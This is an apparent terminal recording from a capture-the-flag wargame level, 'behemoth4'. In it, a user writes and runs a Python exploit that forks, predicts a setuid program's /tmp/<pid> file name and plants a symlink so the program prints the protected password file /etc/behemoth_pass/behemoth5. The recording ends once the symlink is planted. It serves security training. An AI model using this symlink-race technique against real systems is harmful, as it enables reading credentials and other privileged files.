[9.471, "o", "$ cat /tmp/e_behemoth4.py\r\n\u001b[?25l\u001b[32;73Hi\u001b[1;1H\u001b[32;73H \u001b[1;1H\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;13H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1H\u001b[?25h\u001b[?25limport os, struct, sys\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25l\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l# behemoth4: sprintf(buf, \"/tmp/%d\", getpid()); fopen(buf, \"r\"); sleep(1);\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l# then it prints every byte of the file, byte by byte (putchar loop).\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25l# The pid it uses is ITS OWN pid, so the file name is knowable before it opens\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25l# it -- we only have to win the tiny race between exec and fopen. Fork first,\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25l# so we know the child's pid, plant the symlink, and let the child run.\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25ltarget = sys.argv[1] if len(sys.argv) > 1 else \"/etc/behemoth_pass/behemoth5\"\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25l\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25lpid = os.fork()\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25lif pid == 0:\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25l    os.execve(b\"/behemoth/behemoth4\", [b\"/behemoth/behemoth4\"], {})\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25lpath = \"/tmp/%d\" % pid\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25ltry:\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25l    os.unlink(path)\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[?25lexcept OSError:\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25l    pass\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25los.symlink(target, path)\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25lprint(\"planted %s -> %s\" % (path, os.readlink(path)), flush=True)\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25los.waitpid(pid, 0)\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25lprint(\"B4\" + \"DONE\", flush=True)\u001b[22;1H\u001b[K\u001b[32;84H2\u001b[22;1H\u001b[?25h\u001b[32;1H\u001b[K\u001b[?25l\u001b[32;83H22,0-1\u001b[8CAll\u001b[22;1H\u001b[?25h\u001b[?25l\u001b[32;83H\u001b[K\u001b[32;1H:wq\r\u001b[?2004l\u001b[>4;m\"/tmp/e_behemoth4.py\" [New] 22L, 791B written\r\u001b[23;2t\u001b[23;1t\r\r\r\n\u001b[?1004l\u001b[?2004l\u001b[?1l\u001b>\u001b[?1049l\u001b[23;0;0t\u001b[?25h\u001b[>4;m\u001b]3008;end=a6c2e018-1de0-4bae-879e-b3cb45d2419b;exit=success\u001b\\\u001b]3008;start=09620cb4-5010-4bb8-ab71-8a5358988ebb;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth4\u001b\\\u001b[?2004h\u001b]0;behemoth4@behemoth: ~\u0007behemoth4@behemoth:~$ $ python3 /tmp/e_behemoth4.py\r\n"]
[0.421, "o", "cat /tmp/e_behemoth4.py\r\r\n\u001b[?2004l\r\u001b]3008;start=45f5142f-36ac-4dcf-a4b4-cd5ef11314b1;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth4\u001b\\import os, struct, sys\r\r\n\r\r\n# behemoth4: sprintf(buf, \"/tmp/%d\", getpid()); fopen(buf, \"r\"); sleep(1);\r\r\n# then it prints every byte of the file, byte by byte (putchar loop).\r\r\n# The pid it uses is ITS OWN pid, so the file name is knowable before it opens\r\r\n# it -- we only have to win the tiny race between exec and fopen. Fork first,\r\r\n# so we know the child's pid, plant the symlink, and let the child run.\r\r\ntarget = sys.argv[1] if len(sys.argv) > 1 else \"/etc/behemoth_pass/behemoth5\"\r\r\n\r\r\npid = os.fork()\r\r\nif pid == 0:\r\r\n    os.execve(b\"/behemoth/behemoth4\", [b\"/behemoth/behemoth4\"], {})\r\r\npath = \"/tmp/%d\" % pid\r\r\ntry:\r\r\n    os.unlink(path)\r\r\nexcept OSError:\r\r\n    pass\r\r\nos.symlink(target, path)\r\r\nprint(\"planted %s -> %s\" % (path, os.readlink(path)), flush=True)\r\r\nos.waitpid(pid, 0)\r\r\nprint(\"B4\" + \"DONE\", flush=True)\r\r\n\r\r\n\u001b]3008;end=45f5142f-36ac-4dcf-a4b4-cd5ef11314b1;exit=success\u001b\\\u001b]3008;start=09620cb4-5010-4bb8-ab71-8a5358988ebb;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth4\u001b\\\u001b[?2004h\u001b]0;behemoth4@behemoth: ~\u0007behemoth4@behemoth:~$ python3 /tmp/e_behemoth4.py\r\r\n\u001b[?2004l\r\u001b]3008;start=75bd1bff-9932-475d-aba7-d7779cb17104;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth4\u001b\\planted /tmp/78 -> /etc/behemoth_pass/behemoth5\r\r\n"]
